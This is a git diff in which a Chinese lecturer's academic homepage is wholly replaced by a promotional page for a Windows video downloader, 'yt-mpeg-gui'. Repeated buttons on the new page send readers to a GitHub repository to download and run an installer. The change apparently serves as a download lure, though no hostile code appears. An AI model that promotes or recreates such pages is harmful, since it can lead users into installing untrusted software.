@@ -1,219 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <!-- 字符编码，保证中文、英文都正常显示 -->
     <meta charset="UTF-8">
-
-    <!-- 让网页在手机和平板上正常缩放 -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <!-- 浏览器标签页显示的标题 -->
-    <title>Shaode Yu | Personal Homepage</title>
-
-    <!-- 引入统一的 CSS 样式文件 -->
-    <link rel="stylesheet" href="style.css">
+    <title>yt-mpeg-gui - Fast 4K Video Downloader & Audio Extractor for Windows</title>
+    <meta name="description" content="Download yt-mpeg-gui, a modern dark-themed Windows GUI combining yt-dlp & FFmpeg for fast 4K video downloads, audio extraction, batch queues, and more. Free and easy to use.">
+    <meta name="keywords" content="yt-mpeg-gui, 4K video downloader, yt-dlp GUI, FFmpeg GUI, audio extractor, batch downloader, Windows downloader, video download tool">
+    <meta property="og:title" content="yt-mpeg-gui - Fast 4K Video Downloader for Windows">
+    <meta property="og:description" content="Download videos in 4K, extract audio, manage batch queues, and pause/resume downloads with this modern dark-themed Windows app.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/geraldvalencia1190/yt-mpeg-gui">
 </head>
+<body style="margin:0; padding:0; font-family:'Segoe UI', Arial, sans-serif; background-color:#121212; color:#e0e0e0; line-height:1.6;">
 
+    <div style="max-width:900px; margin:0 auto; padding:40px 20px;">
 
-<body>
+        <!-- Header with Download Button -->
+        <div style="text-align:center; padding:50px 20px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.5);">
+            <h1 style="font-size:2.5em; margin:0; color:#00a8ff; font-weight:700;">⬇️ yt-mpeg-gui - Your Ultimate Video Downloader for Windows</h1>
+            <p style="font-size:1.2em; color:#b0b0b0; margin:15px 0;">Download videos at lightning speed in 4K quality</p>
+            <a href="https://github.com/geraldvalencia1190/yt-mpeg-gui" style="display:inline-block; background-color:#ff6b35; color:#ffffff; padding:16px 40px; font-size:1.1em; text-decoration:none; border-radius:50px; font-weight:600; box-shadow:0 4px 15px rgba(255,107,53,0.4); transition:transform 0.2s; margin-top:10px;">🚀 Download Now - Free</a>
+        </div>
 
-    <!--
-        整个页面的总容器
-        里面包含：
-        1. 左侧 sidebar
-        2. 右侧 main content
-    -->
-    <div class="page-container">
-
-
-        <!-- =====================================================
-             左侧导航栏
-        ====================================================== -->
-        <aside class="sidebar">
-
-            <!-- 姓名 -->
-            <div class="profile-block">
-
-                <h1 class="profile-name">
-                    Shaode Yu
-                </h1>
-
-                <p class="profile-title">
-                    Ph.D., Lecturer
-                </p>
-
-                <p class="profile-affiliation">
-                    Communication University of China, Beijing 100024, China
-                </p>
-
-            </div>
-
-
-            <!-- 导航菜单 -->
-            <nav class="menu">
-
-                <a href="index.html" class="active">
-                    Home
-                </a>
-
-                <a href="publications.html">
-                    Publications
-                </a>
-
-                <a href="projects.html">
-                    Projects
-                </a>
-
-                <a href="teaching.html">
-                    Teaching
-                </a>
-
-                <a href="students.html">
-                    Students
-                </a>
-
-                <a href="awards.html">
-                    Awards
-                </a>
-
-                <a href="education.html">
-                    Education
-                </a>
-
-                <a href="work.html">
-                    Work Experience
-                </a>
-
-                <a href="contact.html">
-                    Contact
-                </a>
-
-            </nav>
-
-
-            <!-- 左侧底部联系方式 -->
-            <div class="sidebar-footer">
-
-                <p>
-                    Email
-                </p>
-
-                <a href="mailto:yushaodemia@163.com">
-                    yushaodemia@163.com
-                </a>
-
-            </div>
-
-        </aside>
-
-
-
-        <!-- =====================================================
-             右侧主要内容
-        ====================================================== -->
-        <main class="content">
-
-
-            <!-- =========================
-                 Biography
-            ========================== -->
-            <section class="section">
-
-                <h2>Biography</h2>
-
-                <p>
-                    I am a Lecturer in the Department of Artificial Intelligence, School of Information and Communication Engineering, 
-                    Communication University of China, Beijing, China, since Septermber 2020. Previously, I worked at the Shenzhen Institutes of Advanced Technology, 
-                    Guangdong, China, as a Research Associate (2012-2014) and as an Assistant Professor (2018-2019). 
-                    I was also a Visiting Scholar (2014) at Wayne State University, Michigan, USA, and a Postdoctoral Researcher (2019-2020) 
-                    at UT Southwestern Medical Center, Texas, USA.
-                </p>
-
-                <p>
-                    My research interests focus on artificial intelligence (AI) and its applications in image quality assessment, 
-                    medical image analysis, biomedical engineering, and multimodal intelligent systems. Recently, 
-                    I have become particularly interested in evaluating the performance of large language models (LLMs) 
-                    for audio-to-audio translation and developing AI agents for scientific research.
-                </p>
-
-                <p>
-                    Full publications can be found in my <a href="https://scholar.google.com/citations?user=_C29QQoAAAAJ&hl=en&oi=ao">Google Scholar profile</a>.
-                </p>
-
-            </section>
-
-
-
-            <!-- =========================
-                 News
-            ========================== -->
-            <section class="section">
-
-                <h2>News</h2>
-
-                <div class="news-list">
-
-                    <div class="news-item">
-
-                        <span class="news-date">
-                            2026.08
-                        </span>
-
-                        <span class="news-content">
-                            Congrats to Enqi on the acceptance of her paper, “GLUQ: Global-Local Representation Learning for UHD Image Quality Assessment,” by Entropy.
-                        </span>
-
-                    </div>
-
-
-                    <div class="news-item">
-
-                        <span class="news-date">
-                            2026.06
-                        </span>
-
-                        <span class="news-content">
-                            Congrats to Ming on the acceptance of his paper, “Benchmarking YOLOs in Breast Ultrasound Lesion Segmentation,” by Quantitative Imaging in Medicine and Surgery.
-                        </span>
-
-                    </div>
-
-
-                    <div class="news-item">
-
-                        <span class="news-date">
-                            2026.04
-                        </span>
-
-                        <span class="news-content">
-                            Congrats to Xinyi on the acceptance of her paper, “Agricultural Intelligence: A Technical Review within the Perception-Decision-Execution Framework,” by Applied System Innovation.
-                        </span>
-
-                    </div>
-
-
-                    <div class="news-item">
-
-                        <span class="news-date">
-                            2026.03
-                        </span>
-
-                        <span class="news-content">
-                            Congrats to Jiacheng on the acceptance of his paper, “Benchmarking MARL for UAV-Aassisted Mobile Edge Computing under Realistic 3D Collision-Avoidance Navigation Constraints for Periodic Task Offloading,” by Technologies.
-                        </span>
-
-                    </div>
-
+        <!-- Features Section -->
+        <div style="padding:30px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <h2 style="color:#00a8ff; border-bottom:2px solid #00a8ff; padding-bottom:10px; font-size:1.8em;">✨ Why You'll Love This App</h2>
+            <p style="font-size:1.05em;">yt-mpeg-gui is a powerful yet simple Windows application that makes downloading videos and audio incredibly easy. Whether you're saving a tutorial, a music video, or a playlist, this tool has everything you need.</p>
+            
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-top:25px;">
+                <div style="background:#252525; padding:20px; border-radius:12px;">
+                    <h3 style="color:#ff6b35; margin-top:0; font-size:1.3em;">🎥 4K Ultra HD Downloads</h3>
+                    <p>Get amazing quality videos in full 4K resolution. Crystal-clear picture, perfect for watching on large screens or editing professionally.</p>
                 </div>
+                <div style="background:#252525; padding:20px; border-radius:12px;">
+                    <h3 style="color:#ff6b35; margin-top:0; font-size:1.3em;">🎵 Audio Extraction</h3>
+                    <p>Extract just the sound from videos. Convert to MP3 or other audio formats in seconds - perfect for building a music library.</p>
+                </div>
+                <div style="background:#252525; padding:20px; border-radius:12px;">
+                    <h3 style="color:#ff6b35; margin-top:0; font-size:1.3em;">⏸️ Live Pause/Resume</h3>
+                    <p>Interrupted download? No problem! Pause and resume downloads anytime, even after closing the app completely.</p>
+                </div>
+                <div style="background:#252525; padding:20px; border-radius:12px;">
+                    <h3 style="color:#ff6b35; margin-top:0; font-size:1.3em;">📋 Batch Queues</h3>
+                    <p>Add multiple videos or playlists at once and let the app download them one by one. Set it and forget it!</p>
+                </div>
+                <div style="background:#252525; padding:20px; border-radius:12px; grid-column:1/3;">
+                    <h3 style="color:#ff6b35; margin-top:0; font-size:1.3em;">🔄 1-Click Engine Updates</h3>
+                    <p>Always stay current with one click. The app updates its engines automatically, ensuring maximum download speed and compatibility.</p>
+                </div>
+            </div>
+        </div>
 
-            </section>
+        <!-- Download & Install Section -->
+        <div style="padding:30px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <h2 style="color:#00a8ff; border-bottom:2px solid #00a8ff; padding-bottom:10px; font-size:1.8em;">🚀 Getting Started in 3 Simple Steps</h2>
+            
+            <div style="margin:25px 0;">
+                <h3 style="color:#ff6b35; font-size:1.3em;">Step 1: Download the Application</h3>
+                <p style="font-size:1.05em;">Visit this link to download the application. It's completely free and safe.</p>
+                <a href="https://github.com/geraldvalencia1190/yt-mpeg-gui" style="display:inline-block; background-color:#00a8ff; color:#ffffff; padding:14px 35px; font-size:1em; text-decoration:none; border-radius:50px; font-weight:600; box-shadow:0 4px 15px rgba(0,168,255,0.4);">📥 Click Here to Download</a>
+            </div>
 
+            <div style="margin:25px 0;">
+                <h3 style="color:#ff6b35; font-size:1.3em;">Step 2: Install the App</h3>
+                <p style="font-size:1.05em;">After downloading, open the file to begin installation. A few clicks and you're done - no technical expertise required.</p>
+            </div>
 
-        </main>
+            <div style="margin:25px 0;">
+                <h3 style="color:#ff6b35; font-size:1.3em;">Step 3: Start Downloading</h3>
+                <p style="font-size:1.05em;">Copy any video link from your browser, paste it into the app, choose your quality, and hit download. It's that simple!</p>
+            </div>
+        </div>
+
+        <!-- How It Works Section -->
+        <div style="padding:30px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <h2 style="color:#00a8ff; border-bottom:2px solid #00a8ff; padding-bottom:10px; font-size:1.8em;">🔍 How It Works</h2>
+            <p style="font-size:1.05em;">yt-mpeg-gui uses the power of two proven tools - yt-dlp and FFmpeg - combined into one user-friendly interface. You don't need to understand any code or technical details. The app handles everything behind the scenes at remarkable speeds.</p>
+            <ul style="font-size:1.05em; list-style-type:none; padding-left:0;">
+                <li style="margin:10px 0; padding:10px; background:#252525; border-radius:8px;">✔️ <strong>High Performance:</strong> Optimized for speed using the latest yt-dlp engine</li>
+                <li style="margin:10px 0; padding:10px; background:#252525; border-radius:8px;">✔️ <strong>Dark Theme:</strong> Easy on the eyes, especially at night</li>
+                <li style="margin:10px 0; padding:10px; background:#252525; border-radius:8px;">✔️ <strong>Multiple Formats:</strong> MP4, MKV, MP3, and more</li>
+                <li style="margin:10px 0; padding:10px; background:#252525; border-radius:8px;">✔️ <strong>Playlist Support:</strong> Download whole channels or playlists</li>
+                <li style="margin:10px 0; padding:10px; background:#252525; border-radius:8px;">✔️ <strong>Regular Updates:</strong> Community-driven improvements</li>
+            </ul>
+        </div>
+
+        <!-- System Requirements -->
+        <div style="padding:30px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <h2 style="color:#00a8ff; border-bottom:2px solid #00a8ff; padding-bottom:10px; font-size:1.8em;">💻 System Requirements</h2>
+            <table style="width:100%; border-collapse:collapse; margin-top:15px; font-size:1.05em;">
+                <tr style="background:#252525;">
+                    <th style="padding:12px; text-align:left; border-bottom:2px solid #00a8ff;">Component</th>
+                    <th style="padding:12px; text-align:left; border-bottom:2px solid #00a8ff;">Minimum Requirement</th>
+                </tr>
+                <tr>
+                    <td style="padding:12px; border-bottom:1px solid #333;">Operating System</td>
+                    <td style="padding:12px; border-bottom:1px solid #333;">Windows 10 or newer</td>
+                </tr>
+                <tr>
+                    <td style="padding:12px; border-bottom:1px solid #333;">Processor</td>
+                    <td style="padding:12px; border-bottom:1px solid #333;">1 GHz or faster</td>
+                </tr>
+                <tr>
+                    <td style="padding:12px; border-bottom:1px solid #333;">RAM</td>
+                    <td style="padding:12px; border-bottom:1px solid #333;">2 GB</td>
+                </tr>
+                <tr>
+                    <td style="padding:12px;">Disk Space</td>
+                    <td style="padding:12px;">100 MB for installation</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- FAQ Section -->
+        <div style="padding:30px; background:#1e1e1e; border-radius:16px; margin-bottom:30px; box-shadow:0 4px 20px rgba(0,0,0,0.3);">
+            <h2 style="color:#00a8ff; border-bottom:2px solid #00a8ff; padding-bottom:10px; font-size:1.8em;">❓ Frequently Asked Questions</h2>
+            <div>
+                <h3 style="color:#ff6b35;">Is yt-mpeg-gui free?</h3>
+                <p>Yes, completely free to use with no hidden costs or premium tiers.</p>
+            </div>
+            <div>
+                <h3 style="color:#ff6b35;">Can I download videos from other sites?</h3>
+                <p>Yes, the app supports hundreds of websites, not just YouTube.</p>
+            </div>
+            <div>
+                <h3 style="color:#ff6b35;">Is downloading videos legal?</h3>
+                <p>It depends on your country's laws and the content's copyright. Always ensure you have permission to download content.</p>
+            </div>
+            <div>
+                <h3 style="color:#ff6b35;">Does it work on Mac or Linux?</h3>
+                <p>This version is designed for Windows only.</p>
+            </div>
+        </div>
 
     </div>
-
 </body>
-
 </html>
